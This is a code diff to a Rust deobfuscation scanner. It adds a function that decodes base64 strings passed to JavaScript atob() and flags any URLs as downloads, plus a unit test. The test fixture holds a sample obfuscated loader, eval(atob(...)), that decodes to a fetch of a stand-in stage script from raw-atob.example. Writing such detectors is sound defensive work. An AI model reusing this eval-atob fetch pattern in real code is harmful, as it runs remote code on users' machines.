@@ -3099,6 +3099,7 @@ pub fn scan_deob_text(deobfuscated: &str, env: &mut Environment) {
     scan_ps_char_index_extractor_urls(deobfuscated, env);
     scan_js_fromcharcode_urls(deobfuscated, env);
     scan_js_unescape_urls(deobfuscated, env);
+    scan_js_atob_urls(deobfuscated, env);
     scan_extrac32_self_extract(deobfuscated, env);
     scan_ps_var_socket_connect(deobfuscated, env);
     scan_resolved_deob_var_fragment_urls(deobfuscated, env);
@@ -4168,6 +4169,65 @@ fn js_unescape(s: &str) -> String {
         i += 1;
     }
     String::from_utf8_lossy(&out_bytes).into_owned()
+}
+
+/// JavaScript `atob('...')` URL deobfuscation for raw deob text. Extracted
+/// JScript payloads go through `js_scan`; this catches inline/eval JS snippets
+/// that are visible in the deob output but not queued as separate JScript.
+pub fn scan_js_atob_urls(deobfuscated: &str, env: &mut Environment) {
+    use base64::Engine;
+    use once_cell::sync::Lazy;
+    use regex::Regex;
+
+    static ATOB_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)(?:^|[^A-Za-z0-9_$])atob\s*\(\s*['"]([A-Za-z0-9+/=\s]+)['"]\s*\)"#)
+            .expect("js atob re")
+    });
+
+    let known = env.known_extracted_urls();
+    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
+    for caps in ATOB_RE.captures_iter(deobfuscated) {
+        let Some(m) = caps.get(1) else { continue };
+        let encoded = m.as_str();
+        if encoded.len() < 12 || encoded.len() > 16 * 1024 {
+            continue;
+        }
+        let bytes = encoded.as_bytes();
+        let cleaned = if bytes.iter().any(|b| b.is_ascii_whitespace()) {
+            std::borrow::Cow::Owned(
+                bytes
+                    .iter()
+                    .copied()
+                    .filter(|b| !b.is_ascii_whitespace())
+                    .collect::<Vec<u8>>(),
+            )
+        } else {
+            std::borrow::Cow::Borrowed(bytes)
+        };
+        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(&cleaned) else {
+            continue;
+        };
+        if decoded.len() < 8 || decoded.len() > 16 * 1024 {
+            continue;
+        }
+        let decoded = String::from_utf8_lossy(&decoded);
+        for url_caps in URL_RE.captures_iter(&decoded) {
+            let Some(url_m) = url_caps.get(1) else {
+                continue;
+            };
+            let url = trim_url_suffix(url_m.as_str());
+            if url.len() < 8 || is_noise_url(url) {
+                continue;
+            }
+            if known.contains(url) || !seen.insert(url.to_string()) {
+                continue;
+            }
+            env.traits.push(Trait::DownloadInDeobText {
+                src: url.to_string(),
+                line_hint: "js-atob".to_string(),
+            });
+        }
+    }
 }
 
 /// JavaScript `String.fromCharCode(78,69,84,…)` URL deobfuscation.
@@ -5580,6 +5640,36 @@ mod js_fromcharcode_url_tests {
         // Non-digit garbage between commas — should not crash.
         let script = r#"var x = String.fromCharCode(72, abc, 105);"#;
         let _ = urls(script); // smoke test
+    }
+}
+
+#[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod js_atob_deob_text_tests {
+    use super::scan_deob_text;
+    use crate::env::Environment;
+    use crate::traits::Trait;
+    use crate::Config;
+    use base64::Engine;
+
+    #[test]
+    fn raw_deob_text_atob_payload_urls_surface() {
+        let decoded = "fetch('https://raw-atob.example/stage.js')";
+        let encoded = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let mut env = Environment::new(&Config::default());
+
+        scan_deob_text(&format!("eval(atob('{encoded}'));"), &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::DownloadInDeobText { src, line_hint }
+                    if src == "https://raw-atob.example/stage.js"
+                        && line_hint == "js-atob"
+            )),
+            "raw atob URL was not surfaced: {:?}",
+            env.traits
+        );
     }
 }
 
